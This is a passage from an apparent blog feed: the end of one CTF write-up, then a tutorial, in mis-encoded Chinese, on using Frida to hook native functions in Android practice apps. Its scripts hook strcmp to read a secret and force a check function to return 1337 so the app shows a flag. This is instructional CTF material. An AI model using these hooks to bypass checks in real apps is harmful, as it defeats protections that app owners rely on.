å¼‚æˆ–è§£å¯†</span><br>flag_bytes = <span class="hljs-built_in">bytes</span>([encrypted_bytes[i] ^ key[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypted_bytes))])<br><br><span class="hljs-comment"># è¾“å‡ºflag</span><br><span class="hljs-built_in">print</span>(flag_bytes.decode())<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">but_y0u_l00k3d_up_@</span>t_th3_mOOn&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é‡ç”Ÿä¹‹æˆ‘è¦æˆä¸º Frida ç³•æ‰‹:å…³äº Frida Native å±‚ Hook</title>
    <link href="/2025/04/03/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-%E5%85%B3%E4%BA%8E-Frida-Native-%E5%B1%82-Hook/"/>
    <url>/2025/04/03/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E8%A6%81%E6%88%90%E4%B8%BA-Frida-%E7%B3%95%E6%89%8B-%E5%85%B3%E4%BA%8E-Frida-Native-%E5%B1%82-Hook/</url>
    
    <content type="html"><![CDATA[<p>Hook Native å±‚è°ƒç”¨çš„å‡½æ•°å¹¶è¯»å–ä¼ å…¥çš„å‚æ•°ã€Hook ä¿®æ”¹ Native å±‚å‡½æ•°çš„è¿”å›å€¼ã€ä¸»åŠ¨è°ƒç”¨ Native å±‚æœªè¢«è°ƒç”¨çš„æ–¹æ³•</p><span id="more"></span><h1 id="Processã€Moduleã€Memory"><a href="#Processã€Moduleã€Memory" class="headerlink" title="Processã€Moduleã€Memory"></a>Processã€Moduleã€Memory</h1><p>å‚è€ƒ 52 çš„æ­£å·±å¸ˆå‚…çš„æ–‡ç« ï¼š<a href="https://www.52pojie.cn/thread-1840174-1-1.html"><strong>ã€Šå®‰å“é€†å‘è¿™æ¡£äº‹ã€‹åäº”ã€æ˜¯æ—¶å€™å­¦ä¹ ä¸€ä¸‹Fridaä¸€æŠŠæ¢­äº†(ä¸‹)</strong> </a></p><h2 id="1ã€Process"><a href="#1ã€Process" class="headerlink" title="1ã€Process"></a>1ã€Process</h2><p><code>Process</code> å¯¹è±¡ä»£è¡¨å½“å‰è¢« hook çš„è¿›ç¨‹ï¼Œèƒ½è·å–è¿›ç¨‹çš„ä¿¡æ¯ï¼Œæšä¸¾æ¨¡å—ã€èŒƒå›´ç­‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Process</span>.<span class="hljs-property">id</span>è¿”å›é™„åŠ è¿›ç¨‹çš„ <span class="hljs-variable constant_">PID</span><br><span class="hljs-title class_">Process</span>.<span class="hljs-title function_">isDebuggerAttached</span>()æ£€æµ‹å½“å‰æ˜¯å¦å¯¹ç›®æ ‡ç¨‹åºå·²ç»é™„åŠ <br><span class="hljs-title class_">Process</span>.<span class="hljs-title function_">enumerateMedules</span>()æšä¸¾å½“å‰åŠ è½½æ¨¡å—ï¼Œè¿”å›æ¨¡å—å¯¹è±¡æ•°ç»„<br><span class="hljs-title class_">Process</span>.<span class="hljs-title function_">enumerateThreads</span>()æšä¸¾å½“å‰æ‰€æœ‰çš„çº¿ç¨‹ï¼Œè¿”å›åŒ…å« idï¼Œstateï¼Œcontext ç­‰å±æ€§çš„å¯¹è±¡æ•°ç»„<br></code></pre></td></tr></table></figure><h2 id="2ã€Module"><a href="#2ã€Module" class="headerlink" title="2ã€Module"></a>2ã€Module</h2><p><code>Module</code> å¯¹è±¡ä»£è¡¨åŠ è½½åˆ°è¿›ç¨‹çš„æ¨¡å—ï¼Œèƒ½æŸ¥è¯¢æ¨¡å—çš„ä¿¡æ¯ï¼Œå¦‚æ¨¡å—çš„åŸºå€ã€åç§°ã€å¯¼å…¥ã€å¯¼å‡ºå‡½æ•°ç­‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">load</span>()åŠ è½½æŒ‡å®š so æ–‡ä»¶ï¼Œè¿”å›ä¸€ä¸ª <span class="hljs-title class_">Module</span> å¯¹è±¡<br><span class="hljs-title function_">enumerateImports</span>()æšä¸¾æ‰€æœ‰çš„ <span class="hljs-title class_">Import</span> åº“å‡½æ•°ï¼Œè¿”å› <span class="hljs-title class_">Module</span> æ•°ç»„å¯¹è±¡<br><span class="hljs-title function_">enumerateExports</span>()æšä¸¾æ‰€æœ‰çš„ <span class="hljs-title class_">Export</span> åº“å‡½æ•°ï¼Œè¿”å› <span class="hljs-title class_">Module</span> æ•°ç»„å¯¹è±¡<br><span class="hljs-title function_">enumerateSymbols</span>()æšä¸¾æ‰€æœ‰çš„ <span class="hljs-title class_">Symbol</span> åº“å‡½æ•°ï¼Œè¿”å› <span class="hljs-title class_">Module</span> æ•°ç»„å¯¹è±¡<br><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(exportName)ã€<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(exportName)å¯»æ‰¾æŒ‡å®š so ä¸­ <span class="hljs-keyword">export</span> åº“ä¸­å‡½æ•°åœ°å€<br><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(name)ã€<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getBaseAddress</span>(name)è¿”å› so çš„åŸºåœ°å€<br></code></pre></td></tr></table></figure><h2 id="3ã€Memory"><a href="#3ã€Memory" class="headerlink" title="3ã€Memory"></a>3ã€Memory</h2><p><code>Memory</code> æä¾›ç›´æ¥è¯»å–å’Œä¿®æ”¹è¿›ç¨‹å†…å­˜çš„åŠŸèƒ½ï¼Œèƒ½å¤Ÿè¯»å–ç‰¹å®šåœ°å€çš„å€¼ã€å†™å…¥æ•°æ®ã€åˆ†é…å†…å­˜ç­‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">copy</span>()å¤åˆ¶å†…å­˜<br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">scan</span>()æœç´¢å†…å­˜ä¸­ç‰¹å®šæ¨¡å¼çš„æ•°æ®<br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">scanSync</span>()æœç´¢å†…å­˜ä¸­ç‰¹å®šæ¨¡å¼çš„æ•°æ®ï¼Œè¿”å›å¤šä¸ªåŒ¹é…æ•°æ®<br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">alloc</span>()åœ¨ç›®æ ‡è¿›ç¨‹çš„å †ä¸Šç”³è¯·æŒ‡å®šå¤§å°çš„å†…å­˜ï¼Œè¿”å›ä¸€ä¸ª <span class="hljs-title class_">NativePointer</span><br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>()å°†å­—èŠ‚æ•°ç»„å†™å…¥ä¸€ä¸ªæŒ‡å®šå†…å­˜<br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readByteArray</span>()è¯»å–å†…å­˜<br></code></pre></td></tr></table></figure><h1 id="Hook-Native-å±‚è°ƒç”¨çš„å‡½æ•°å¹¶è¯»å–ä¼ å…¥çš„å‚æ•°"><a href="#Hook-Native-å±‚è°ƒç”¨çš„å‡½æ•°å¹¶è¯»å–ä¼ å…¥çš„å‚æ•°" class="headerlink" title="Hook Native å±‚è°ƒç”¨çš„å‡½æ•°å¹¶è¯»å–ä¼ å…¥çš„å‚æ•°"></a>Hook Native å±‚è°ƒç”¨çš„å‡½æ•°å¹¶è¯»å–ä¼ å…¥çš„å‚æ•°</h1><h2 id="Hook-æ¨¡æ¿"><a href="#Hook-æ¨¡æ¿" class="headerlink" title="Hook æ¨¡æ¿"></a>Hook æ¨¡æ¿</h2><p>Native å±‚å‡½æ•° hook æ¨¡æ¿</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>    <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Entering&#x27;</span>+functionName);<br>        <span class="hljs-comment">//æ‰“å°å’Œä¿®æ”¹å‚æ•°</span><br>    &#125;,<br>    <span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Leaving&#x27;</span>+functionName);<br>        <span class="hljs-comment">//æ‰“å°å’Œä¿®æ”¹è¿”å›å€¼</span><br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li><code>Interceptor.attach</code>ï¼šå°†å›è°ƒå‡½æ•°é™„åŠ åˆ°æŒ‡å®šçš„å‡½æ•°åœ°å€ï¼ŒæŒ‚é’©å‡½æ•°ï¼Œæ‹¦æˆªæ‰€æœ‰å¯¹å®ƒçš„è°ƒç”¨ã€‚</li><li><code>targetAddress</code> ï¼šéœ€è¦æŒ‚é’©çš„æœ¬åœ°å‡½æ•°çš„åœ°å€ã€‚</li><li><code>onEnter</code>ï¼šå½“æŒ‚é’©çš„å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œæä¾›å¯¹å‡½æ•°å‚æ•° (<code>args</code>) çš„è®¿é—®ï¼Œå¯ä»¥æ‰§è¡Œè®¿é—®å‡½æ•°çš„å‚æ•°ï¼Œä¿®æ”¹å‚æ•°çš„å€¼ï¼Œè®°å½•å‡½æ•°è°ƒç”¨ä¿¡æ¯ç­‰æ“ä½œã€‚</li><li><code>onLeave</code>ï¼šå½“æŒ‚é’©çš„å‡½æ•°å³å°†é€€å‡ºæ—¶ï¼Œè°ƒç”¨æ­¤å›è°ƒï¼Œæä¾›å¯¹è¿”å›å€¼ (<code>retval</code>) çš„è®¿é—®ã€‚</li></ul><h2 id="Frida-0x8-Native-Hook"><a href="#Frida-0x8-Native-Hook" class="headerlink" title="Frida 0x8 Native Hook"></a>Frida 0x8 Native Hook</h2><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><p>jadx æ‰“å¼€æŸ¥çœ‹æºç ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²ä½œä¸º <code>cmpstr</code> æ–¹æ³•çš„å‚æ•°ï¼Œè¿”å›1 åˆ™æ˜¾ç¤º flagï¼Œèƒ½çœ‹åˆ° <code>cmpstr</code> æ–¹æ³•å®ç°ä½äº Native å±‚</p><p><img src="https://img.dkdun.cn/v1/2025/12/858fe4f6f6c7f820.png"></p><h3 id="Native-å±‚é€»è¾‘"><a href="#Native-å±‚é€»è¾‘" class="headerlink" title="Native å±‚é€»è¾‘"></a>Native å±‚é€»è¾‘</h3><p>å¯ä»¥å‘ç°ä½¿ç”¨äº† <code>strcmp</code> å‡½æ•°ï¼Œå¦‚æœè¾“å…¥çš„å‚æ•°  <code>s1</code> å’Œ <code>s2</code>  æ¯”è¾ƒç›¸ç­‰çš„è¯è¿”å› 0ï¼Œä»è€Œè¾“å‡ºç»“æœã€‚å› æ­¤åªéœ€è¦ hook <code>strcmp</code> å‡½æ•°æ‹¿åˆ°å®ƒçš„å‚æ•°å°±å¯ä»¥äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/807d469991b3a316.png"></p><h3 id="Hook-API"><a href="#Hook-API" class="headerlink" title="Hook API"></a>Hook API</h3><p>hook ä¹‹å‰éœ€è¦å…ˆè·å–å‡½æ•°åœ°å€ã€å‡½æ•°çš„å¯¼å…¥å¯¼å‡ºåº“ã€åº“åŸºå€ç­‰ç­‰ï¼Œå¦‚å‰é¢çš„ <code>Module</code> ä¸­çš„ APIã€‚</p><h4 id="æŸ¥æ‰¾å½“å‰è°ƒç”¨çš„åŠ¨æ€åº“"><a href="#æŸ¥æ‰¾å½“å‰è°ƒç”¨çš„åŠ¨æ€åº“" class="headerlink" title="æŸ¥æ‰¾å½“å‰è°ƒç”¨çš„åŠ¨æ€åº“"></a>æŸ¥æ‰¾å½“å‰è°ƒç”¨çš„åŠ¨æ€åº“</h4><p>ç¬¬ä¸€ç§å°±æ˜¯åœ¨ jadx ä¸­èƒ½çœ‹åˆ°ï¼Œåœ¨ <code>frida0x8</code> åº“ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>System.loadLibrary(<span class="hljs-string">&quot;frida0x8&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯ ida ä¸­æ‰¾åˆ° <code>String Table</code> ç‰‡æ®µ</p><p>æœ‰ä¸€äº›è¿è¡Œæ—¶è°ƒç”¨çš„å‡½æ•°ï¼Œ<code>Java_com_ad2001_frida0x8_MainActivity_cmpstr</code> å¯¹äº Java ç±»ä¸­çš„ Native æ–¹æ³• <code>cmpstr</code> ï¼Œéµå¾ª  JNI å‡½æ•°çš„å‘½åè§„èŒƒï¼š<strong>Java_+classname+_+functionname</strong>ï¼Œå…¶ä¸­ <code>classname</code> æ˜¯è¯¥å‡½æ•°æ‰€å±çš„ Java ç±»çš„åç§°ï¼Œ<code>functionname</code> æ˜¯è¯¥å‡½æ•°çš„åç§°ã€‚å¯ä»¥çœ‹åˆ°åé¢è¿˜æœ‰ä¸€äº›åŠ¨æ€åº“ï¼š<code>libc.soï¼Œliblog.soï¼Œlibm.soï¼Œlibdl.soï¼Œlibfrida0x8.so</code>ï¼Œè€Œ <code>libfrida0x8.so</code> å°±æ˜¯å½“å‰åˆ†æçš„åŠ¨æ€åº“ï¼Œä¹Ÿæ˜¯éœ€è¦æŸ¥æ‰¾çš„åŠ¨æ€åº“</p><p><img src="https://img.dkdun.cn/v1/2025/12/b12bc6896c9adb27.png"></p><h4 id="Module-enumerateImports-libname"><a href="#Module-enumerateImports-libname" class="headerlink" title="Module.enumerateImports(libname)"></a>Module.enumerateImports(libname)</h4><p>æŸ¥çœ‹å¯¼å…¥å‡½æ•°è¡¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateImports</span>(<span class="hljs-string">&quot;libfrida0x8.so&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a634dd71c68bc4c5.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">&quot;0x7ffff5e67020&quot;</span>,<br>    <span class="hljs-string">&quot;module&quot;</span>: <span class="hljs-string">&quot;/system/lib64/libc.so&quot;</span>,<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;strcmp&quot;</span>,<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span><br>&#125;,<br></code></pre></td></tr></table></figure><p>æ ¹æ®ä¿¡æ¯å¯ä»¥å¾—åˆ° <code>strcmp</code> å‡½æ•°æ¥è‡ªäº <code>libc.so</code>ï¼Œå¯ä»¥ä½¿ç”¨ <code>Module.getExportByName(libname,funcname)</code> æ¥æ‰¾åˆ° <code>strcmp</code> åœ°å€ä¿¡æ¯</p><h4 id="Module-getExportByName-libname-funcname"><a href="#Module-getExportByName-libname-funcname" class="headerlink" title="Module.getExportByName(libname,funcname)"></a>Module.getExportByName(libname,funcname)</h4><p>è·å– <code>strcmp</code> å‡½æ•°çš„åœ°å€</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/94586fc7026b26c2.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">0x7ffff5e67020</span><br></code></pre></td></tr></table></figure><h3 id="hook-ä»£ç "><a href="#hook-ä»£ç " class="headerlink" title="hook ä»£ç "></a>hook ä»£ç </h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook8</span>(<span class="hljs-params"></span>)&#123;<br><br>    <span class="hljs-keyword">var</span> targetAddress=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Strcmp Address:&quot;</span>,targetAddress.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>    <span class="hljs-comment">//æ‰“å° strcmp çš„åœ°å€ï¼Œä»¥åå…­è¿›åˆ¶æ ¼å¼è¾“å‡º</span><br><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> input=<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-comment">// è·å–è¾“å…¥çš„å­—ç¬¦ä¸²</span><br>            <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;11111&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>                <span class="hljs-comment">// æ‰“å°è¾“å‡º strcmp çš„ç¬¬äºŒä¸ªå‚æ•°çš„å€¼</span><br>            &#125;<br><br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br><br>        &#125;<br>    &#125;)<br>   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook8</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/0cd696bfcff4ced9.png"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><h3 id="å¦‚ä½•-Hook"><a href="#å¦‚ä½•-Hook" class="headerlink" title="å¦‚ä½• Hook"></a>å¦‚ä½• Hook</h3><p>Hook Java å±‚å‡½æ•°éœ€è¦çŸ¥é“å‡½æ•°çš„åŒ…åå’Œç±»åï¼Œä½†å¯¹äº Native å±‚å‡½æ•°çš„ hookï¼Œéœ€è¦çŸ¥é“ Native å±‚å‡½æ•°çš„åœ°å€ï¼Œç„¶åä½¿ç”¨ Frida çš„ <code>Interceptor</code>API è¿›è¡Œ Hook</p><h3 id="å¦‚ä½•è·å–å‡½æ•°åœ°å€"><a href="#å¦‚ä½•è·å–å‡½æ•°åœ°å€" class="headerlink" title="å¦‚ä½•è·å–å‡½æ•°åœ°å€"></a>å¦‚ä½•è·å–å‡½æ•°åœ°å€</h3><ol><li>æŸ¥æ‰¾å¯¼å…¥è¡¨åˆ©ç”¨ <code>Module.enumerateImports</code> è·å–å‡½æ•°æ‰€å±åº“ã€‚</li><li>åˆ©ç”¨å‡½æ•°åï¼Œé€šè¿‡ <code>Module.getExportByName</code> å‡½æ•°è·å–å‡½æ•°åœ°å€ã€‚</li><li>é€šè¿‡å‡½æ•°åœ°å€æ‹¦æˆªè¾“å‡ºå‚æ•°ã€‚</li></ol><h1 id="Hook-ä¿®æ”¹-Native-å±‚å‡½æ•°çš„è¿”å›å€¼"><a href="#Hook-ä¿®æ”¹-Native-å±‚å‡½æ•°çš„è¿”å›å€¼" class="headerlink" title="Hook ä¿®æ”¹ Native å±‚å‡½æ•°çš„è¿”å›å€¼"></a>Hook ä¿®æ”¹ Native å±‚å‡½æ•°çš„è¿”å›å€¼</h1><h2 id="Hook-æ¨¡æ¿-1"><a href="#Hook-æ¨¡æ¿-1" class="headerlink" title="Hook æ¨¡æ¿"></a>Hook æ¨¡æ¿</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress, &#123;<br>    <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br><br>    &#125;,<br>    <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Leaving &#x27;</span> + functionName);<br>        retval.<span class="hljs-title function_">replace</span>(value)<br>        <span class="hljs-comment">// å°†ç›®æ ‡å‡½æ•°è¿”å›å€¼ä¿®æ”¹ä¸º value</span><br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Frida-0x9-Native-Hook"><a href="#Frida-0x9-Native-Hook" class="headerlink" title="Frida 0x9 Native Hook"></a>Frida 0x9 Native Hook</h2><h3 id="MainActivity-1"><a href="#MainActivity-1" class="headerlink" title="MainActivity"></a>MainActivity</h3><p><code>check_flag</code> æ–¹æ³•å®šä¹‰åœ¨ native å±‚çš„  <code>a0x9</code> åº“ä¸­ï¼Œæ–¹æ³•æ²¡æœ‰ä»»ä½•è°ƒç”¨å’Œè¿”å›å€¼ï¼Œå½“æŒ‰é’®è¢«ç‚¹å‡»æ—¶ï¼Œ<code>check_flag</code> çš„è¿”å›å€¼ä¸ 1337 æ¯”è¾ƒï¼Œå¦‚æœåŒ¹é…å°±è¾“å‡º flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/1185151e0e7ed1e7.png"></p><h3 id="Native-å±‚é€»è¾‘-1"><a href="#Native-å±‚é€»è¾‘-1" class="headerlink" title="Native å±‚é€»è¾‘"></a>Native å±‚é€»è¾‘</h3><p>è¿”å›äº†ä¸ª 1ï¼Œé‚£ä¹ˆåªéœ€è¦ä½¿å¾—å‡½æ•°ç»“æŸåè¿”å› 1337 å°±è¡Œäº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/7d671cab49c80993.png"></p><h3 id="hook-ä»£ç -1"><a href="#hook-ä»£ç -1" class="headerlink" title="hook ä»£ç "></a>hook ä»£ç </h3><p>æŸ¥çœ‹å¯¼å‡ºè¡¨ï¼Œæ‰¾åˆ° JNI å‡½æ•°å</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Module</span>.<span class="hljs-title function_">enumerateExports</span>(<span class="hljs-string">&quot;liba0x9.so&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/12afbf8a84595366.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>    <span class="hljs-string">&quot;address&quot;</span>: <span class="hljs-string">&quot;0x7fff57b7a670&quot;</span>, <br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;</span>, <br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¹æ®å‡½æ•°åç²¾ç¡®æŸ¥æ‰¾ç›®æ ‡å‡½æ•°åœ°å€</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook9</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> check_flag=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;liba0x9.so&quot;</span>,<span class="hljs-string">&quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;</span>)<br>    <span class="hljs-comment">// é€šè¿‡æŸ¥æ‰¾å¯¼å‡ºå‡½æ•°çš„æ–¹å¼è·å–ç›®æ ‡å‡½æ•°åœ°å€</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Func Address:&quot;</span>,check_flag);<br>    <br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(check_flag,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br><br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Origin retval:&quot;</span>,retval);<br>        retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">1337</span>);<br>        &#125;<br>    &#125;)<br>   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook9</span>();<br>    &#125;)<br>&#125;<br><br><span class="hljs-built_in">setTimeout</span>(main,<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/a4bb8d6e41a8292e.png"></p><h1 id="ä¸»åŠ¨è°ƒç”¨-Native-å±‚æœªè¢«è°ƒç”¨çš„æ–¹æ³•"><a href="#ä¸»åŠ¨è°ƒç”¨-Native-å±‚æœªè¢«è°ƒç”¨çš„æ–¹æ³•" class="headerlink" title="ä¸»åŠ¨è°ƒç”¨ Native 